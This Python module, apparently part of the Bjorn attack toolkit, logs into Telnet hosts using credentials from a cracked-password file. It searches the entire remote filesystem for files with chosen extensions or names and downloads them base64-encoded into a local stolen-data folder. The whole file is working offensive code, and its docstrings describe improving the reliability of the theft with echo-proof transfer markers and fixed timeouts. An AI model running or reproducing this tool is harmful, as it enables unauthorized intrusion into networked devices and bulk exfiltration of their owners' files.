"""
steal_files_telnet.py - This script connects to remote Telnet servers using provided credentials, searches for specific files, and downloads them to a local directory.

NOTE on the transfer design
---------------------------
Telnet gives us a raw interactive shell, not a file channel. The previous code did
`cat {file}` + `read_until(b"$")`, which (a) truncated at the first `$` in the payload,
(b) corrupted every binary, and (c) captured the shell prompt/echo into the file.

This version transfers via base64 delimited by markers chosen to be unambiguous:
  - The markers contain underscores, which are outside the base64 alphabet
    (A-Za-z0-9+/=), so they can never appear inside the encoded payload.
  - The marker literals are split with '' in the remote command, so the shell's
    echo of the command line does not contain the contiguous marker we scan for —
    only the echo command's *output* does. read_until therefore skips the echo and
    stops at the real marker.
Reliability is brought in line with the other five modules: connect timeout, latch
reset per run, a run_token-guarded daemon timer, and bounded reads.
"""

import os
import base64
import telnetlib
import logging
import time
from rich.console import Console
from threading import Timer
from shared import SharedData, settle_for_display
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_telnet.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port = 23

# Connect/read timeouts (seconds). Bounded so a black-holed host can't wedge the worker.
_CONNECT_TIMEOUT = 15
_READ_TIMEOUT = 30

# Transfer markers. Underscores keep them out of the base64 alphabet, so they can never
# collide with encoded payload bytes; the remote command splits the literals with '' so
# the shell's command-echo never contains the contiguous marker we read_until on.
_BEGIN = b"__BJORN_B64_BEGIN__"
_END = b"__BJORN_B64_END__"


class StealFilesTelnet:
    """
    Class to handle the process of stealing files from Telnet servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.telnet_connected = False
            self.stop_execution = False
            logger.info("StealFilesTelnet initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_telnet(self, ip, username, password):
        """
        Establish a Telnet connection. Every read is bounded so a host that never sends
        a login/password prompt cannot hang the worker.
        """
        try:
            tn = telnetlib.Telnet(ip, timeout=_CONNECT_TIMEOUT)
            tn.read_until(b"login: ", timeout=_CONNECT_TIMEOUT)
            tn.write(username.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ", timeout=_CONNECT_TIMEOUT)
                tn.write(password.encode('ascii') + b"\n")
            tn.read_until(b"$", timeout=_CONNECT_TIMEOUT)  # consume the initial prompt (best effort)
            self.telnet_connected = True
            logger.info(f"Connected to {ip} via Telnet with username {username}")
            return tn
        except Exception as e:
            logger.error(f"Telnet connection error for {ip} with user '{username}' & password '{password}': {e}")
            return None

    def _capture(self, tn, remote_cmd):
        """
        Run remote_cmd on the telnet shell and return the raw bytes it printed between
        our markers, or None if the end marker never arrived (timeout/hang).

        The markers are prompt-independent (no reliance on `$`/`#`) and echo-proof (the
        command line's echo carries the split `__BJORN''_...` form, not the contiguous
        marker), so read_until lands on the real output, not the echo.
        """
        wrapped = f"echo __BJORN''_B64_BEGIN__; {remote_cmd}; echo __BJORN''_B64_END__\n"
        tn.write(wrapped.encode('ascii'))
        tn.read_until(_BEGIN, timeout=_READ_TIMEOUT)   # skip command echo, reach the real begin marker
        blob = tn.read_until(_END, timeout=_READ_TIMEOUT)
        if not blob.endswith(_END):
            return None
        return blob[:-len(_END)]

    def find_files(self, tn, dir_path):
        """
        Find files in the remote directory based on the config criteria.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            out = self._capture(tn, f"find '{dir_path}' -type f")
            if out is None:
                logger.error(f"Timed out listing files under {dir_path}")
                return []
            files = out.decode('ascii', errors='ignore').splitlines()
            matching_files = []
            for file in files:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted due to orchestrator exit.")
                    return []
                file = file.strip()
                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                   any(file_name in file for file_name in self.shared_data.steal_file_names):
                    matching_files.append(file)
            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files on Telnet: {e}")
            return []

    def steal_file(self, tn, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory, binary-safe.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            os.makedirs(os.path.dirname(local_file_path) or local_dir, exist_ok=True)

            # Single-quote the path and escape any embedded quote the POSIX way ('\'').
            quoted = remote_file.replace("'", "'\\''")
            out = self._capture(tn, f"base64 '{quoted}' 2>/dev/null")
            if out is None:
                logger.error(f"Timed out reading {remote_file} (no end marker)")
                return
            # validate=False (default) discards the newlines base64 inserts for line wrapping.
            data = base64.b64decode(out)
            if not data:
                logger.warning(f"No data for {remote_file} (empty file, or base64 unavailable on target)")
                return
            with open(local_file_path, 'wb') as f:
                f.write(data)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from Telnet: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using Telnet.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesTelnet"
                # Per-run state, reset here rather than only in __init__. These objects are
                # long-lived singletons built once by orchestrator.load_action, so the flags
                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
                # and every later steal on every host broke out immediately and returned
                # 'failed' — permanently, until the service restarted. Conversely a single
                # success left telnet_connected True and disarmed the timeout for good.
                self.stop_execution = False
                self.telnet_connected = False
                logger.info(f"Stealing files from {ip}:{port}...")
                settle_for_display(self.shared_data)  # let the panel show this action's name
                # Get Telnet credentials from the cracked passwords file
                telnetfile = self.shared_data.telnetfile
                credentials = []
                if os.path.exists(telnetfile):
                    with open(telnetfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                # Token this run. timer.cancel() is only reached on the success path, so a failed
                # steal leaves a live 240s timer behind; without this it would fire midway
                # through a LATER host's steal and abort it by setting stop_execution.
                run_token = object()
                self._run_token = run_token

                def timeout():
                    """
                    Timeout function to stop the execution if no Telnet connection is established.
                    """
                    if getattr(self, '_run_token', None) is not run_token:
                        return  # a later execute() owns the flags now
                    if not self.telnet_connected:
                        logger.error(f"No Telnet connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
                timer.start()

                # Attempt to steal files using each credential
                success = False
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Steal files execution interrupted due to orchestrator exit.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        tn = self.connect_telnet(ip, username, password)
                        if tn:
                            remote_files = self.find_files(tn, '/')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"telnet/{mac}_{ip}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        logger.info("File stealing process interrupted due to orchestrator exit.")
                                        break
                                    self.steal_file(tn, remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                            tn.close()
                            if success:
                                timer.cancel()  # Cancel the timer if the operation is successful
                                return 'success'  # Return success if the operation is successful
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_telnet = StealFilesTelnet(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
